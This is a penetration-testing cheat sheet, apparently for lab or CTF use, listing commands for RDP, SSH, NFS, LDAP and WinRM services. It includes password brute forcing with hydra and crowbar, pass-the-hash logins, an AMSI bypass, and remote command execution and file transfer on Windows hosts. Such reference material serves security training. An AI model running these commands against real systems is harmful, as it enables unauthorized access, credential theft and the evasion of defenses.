# Additional Service Enumeration

## RDP (Port 3389)
```bash
# Scan for RDP vulnerabilities
nmap --script rdp-vuln-ms12-020 -p 3389 $TARGET_IP

# Brute force
crowbar -b rdp -s $TARGET_IP/32 -u user -C pass.txt
```

## SSH (Port 22)
```bash
# Version + banner
nmap -sV -p 22 $TARGET_IP

# Brute force
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://$TARGET_IP

# Check for weak crypto
nmap --script ssh2-enum-algos -p 22 $TARGET_IP
```

## NFS (Port 2049)
```bash
# Show available mounts
showmount -e $TARGET_IP

# Mount NFS share
mkdir /mnt/nfs
sudo mount -t nfs $TARGET_IP:/share /mnt/nfs -o nolock
```

## LDAP (Port 389, 636)
```bash
# Basic enumeration
ldapsearch -x -H ldap://$TARGET_IP -b "dc=$DOMAIN,dc=local"
ldapsearch -x -H ldap://$TARGET_IP -b "dc=$DOMAIN,dc=local" "(objectclass=*)"

# Without credentials
ldapsearch -x -H ldap://$TARGET_IP -b "dc=htb,dc=local" | grep -i "description" | cut -d ":" -f2
```

## WinRM (Port 5985, 5986)
```bash
# Check if WinRM is available
crackmapexec winrm $TARGET_IP -u user -p pass

# Connect via evil-winrm
evil-winrm -i $TARGET_IP -u user -p pass
evil-winrm -i $TARGET_IP -u Administrator -H <NTHASH>

# Upload/download
*Evil-WinRM* PS C:\> upload linpeas.exe
*Evil-WinRM* PS C:\> download C:\Users\Administrator\Desktop\proof.txt

# Bypass AMSI
*Evil-WinRM* PS C:\> Bypass-4MSI

# Run commands via CME
crackmapexec winrm $TARGET_IP -u user -p pass -x whoami
```
